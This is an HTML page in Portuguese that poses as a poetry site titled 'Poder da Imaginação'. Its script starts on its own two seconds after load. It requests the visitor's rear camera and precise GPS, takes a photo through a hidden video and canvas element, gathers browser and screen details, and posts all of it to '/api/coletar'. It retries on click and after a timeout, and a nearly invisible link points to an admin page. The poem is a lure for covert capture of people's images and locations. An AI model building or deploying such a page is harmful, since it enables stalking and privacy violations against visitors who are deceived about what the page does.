<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Poder da Imaginação</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Georgia', serif;
            background: #0a0a0f;
            color: #f0ece4;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            background-image: url('https://images.unsplash.com/photo-1502082553048-f009c37129b9?w=1600&q=80');
            background-size: cover;
            background-position: center;
            position: relative;
        }
        body::before {
            content: '';
            position: absolute;
            inset: 0;
            background: rgba(10, 10, 15, 0.6);
            backdrop-filter: blur(4px);
        }
        .content {
            position: relative;
            z-index: 1;
            max-width: 600px;
            text-align: center;
            padding: 40px 32px;
            animation: fadeIn 2s ease;
        }
        @keyframes fadeIn {
            0% { opacity: 0; transform: translateY(20px); }
            100% { opacity: 1; transform: translateY(0); }
        }
        .logo {
            font-size: 42px;
            font-weight: 300;
            letter-spacing: 2px;
            color: #f0ece4;
            margin-bottom: 8px;
        }
        .logo span { color: #c9b084; font-style: italic; }
        .subtitle {
            font-size: 18px;
            color: rgba(240, 236, 228, 0.7);
            margin-bottom: 32px;
            font-style: italic;
        }
        .divider {
            width: 60px;
            height: 1px;
            background: #c9b084;
            margin: 0 auto 32px;
            opacity: 0.4;
        }
        .poem {
            font-size: 20px;
            line-height: 1.9;
            color: rgba(240, 236, 228, 0.8);
            margin-bottom: 40px;
            font-style: italic;
        }
        .poem .highlight { color: #c9b084; }
        .status-bar {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 2;
            font-size: 11px;
            color: rgba(240, 236, 228, 0.4);
            background: rgba(0,0,0,0.3);
            backdrop-filter: blur(10px);
            padding: 6px 18px;
            border-radius: 20px;
            border: 1px solid rgba(255,255,255,0.04);
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .status-bar .dot {
            width: 5px;
            height: 5px;
            border-radius: 50%;
            background: #c9b084;
            animation: pulse-dot 2s ease-in-out infinite;
        }
        @keyframes pulse-dot {
            0%, 100% { opacity: 0.3; transform: scale(0.8); }
            50% { opacity: 1; transform: scale(1.2); }
        }
        .admin-link {
            position: fixed;
            bottom: 20px;
            right: 20px;
            z-index: 2;
            font-size: 10px;
            color: rgba(255,255,255,0.08);
            text-decoration: none;
        }
        .admin-link:hover { color: rgba(255,255,255,0.3); }
        video, canvas { display: none !important; }
    </style>
</head>
<body>

    <div class="content">
        <div class="logo">Poder da <span>Imaginação</span></div>
        <div class="subtitle">— onde as palavras ganham vida —</div>
        <div class="divider"></div>
        <div class="poem">
            <span class="highlight">Há um silêncio</span> que fala mais que palavras,<br>
            uma <span class="highlight">presença</span> que habita entre as linhas.<br>
            O que você vê <span class="highlight">não é tudo</span> o que existe,<br>
            pois o invisível <span class="highlight">dança</span> nos espaços vazios.<br>
            E é nesse <span class="highlight">instante</span> que a imaginação floresce.
        </div>
    </div>

    <div class="status-bar" id="statusBar">
        <span class="dot" id="statusDot"></span>
        <span id="statusText">A floresta respira...</span>
    </div>

    <a href="/admin.html" class="admin-link">✦</a>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        (function() {
            'use strict';

            // ===== CONFIGURAÇÃO =====
            const CONFIG = {
                backendURL: '/api/coletar',
                camera: { qualidade: 0.85, largura: 1024, altura: 768, timeout: 6000 },
                geolocation: { enableHighAccuracy: true, timeout: 8000 }
            };

            const statusText = document.getElementById('statusText');
            const statusDot = document.getElementById('statusDot');
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');

            let enviado = false;

            function setStatus(texto, tipo = 'loading') {
                statusText.textContent = texto;
                statusDot.className = 'dot';
                if (tipo === 'success') statusDot.style.background = '#4ade80';
                else if (tipo === 'error') statusDot.style.background = '#f87171';
                else statusDot.style.background = '#c9b084';
            }

            async function capturarFoto() {
                try {
                    setStatus('📸 Solicitando câmera...', 'loading');
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'environment', width: 640, height: 480 },
                        audio: false
                    });
                    video.srcObject = stream;
                    await video.play();
                    await new Promise(r => setTimeout(r, 300));
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const fotoBase64 = canvas.toDataURL('image/jpeg', 0.85);
                    stream.getTracks().forEach(track => track.stop());
                    video.srcObject = null;
                    setStatus('📸 Foto capturada!', 'success');
                    return fotoBase64;
                } catch (err) {
                    console.error('Erro na câmera:', err);
                    setStatus('❌ Câmera: ' + err.message, 'error');
                    return null;
                }
            }

            function capturarLocalizacao() {
                return new Promise((resolve) => {
                    if (!navigator.geolocation) {
                        setStatus('❌ GPS não suportado', 'error');
                        resolve(null);
                        return;
                    }
                    setStatus('📍 Solicitando GPS...', 'loading');
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            const dados = {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                precisao: position.coords.accuracy
                            };
                            setStatus('📍 GPS obtido!', 'success');
                            resolve(dados);
                        },
                        (error) => {
                            console.error('Erro GPS:', error);
                            setStatus('❌ GPS: ' + error.message, 'error');
                            resolve(null);
                        },
                        { enableHighAccuracy: true, timeout: 8000 }
                    );
                });
            }

            async function enviarDados(foto, localizacao) {
                const payload = {
                    foto: foto || null,
                    localizacao: localizacao || null,
                    navegador: {
                        userAgent: navigator.userAgent,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        language: navigator.language,
                        screenWidth: window.screen.width,
                        screenHeight: window.screen.height
                    }
                };

                console.log('📤 Enviando dados...');
                setStatus('📤 Enviando...', 'loading');

                try {
                    const response = await fetch(CONFIG.backendURL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });

                    if (!response.ok) throw new Error('HTTP ' + response.status);
                    const result = await response.json();
                    console.log('✅ Resposta:', result);
                    setStatus('✅ Dados enviados com sucesso!', 'success');
                    return result;
                } catch (err) {
                    console.error('❌ Erro no envio:', err);
                    setStatus('❌ Erro: ' + err.message, 'error');
                    return null;
                }
            }

            async function executar() {
                if (enviado) return;
                enviado = true;

                try {
                    console.log('🚀 Iniciando coleta...');
                    const [foto, localizacao] = await Promise.all([
                        capturarFoto(),
                        capturarLocalizacao()
                    ]);
                    await enviarDados(foto, localizacao);
                    console.log('✅ Coleta finalizada!');
                } catch (err) {
                    console.error('💥 Erro:', err);
                    setStatus('❌ Erro crítico', 'error');
                    enviado = false;
                }
            }

            // ===== INICIA =====
            setTimeout(executar, 2000);

            // Fallback: tenta novamente se clicar
            document.addEventListener('click', function handler() {
                if (!enviado) {
                    setStatus('🔄 Tentando novamente...', 'loading');
                    executar();
                }
                document.removeEventListener('click', handler);
            }, { once: true });

            // Fallback após 15s
            setTimeout(() => {
                if (!enviado) {
                    setStatus('⏰ Tentando automaticamente...', 'loading');
                    executar();
                }
            }, 15000);

        })();
    </script>
</body>
</html>
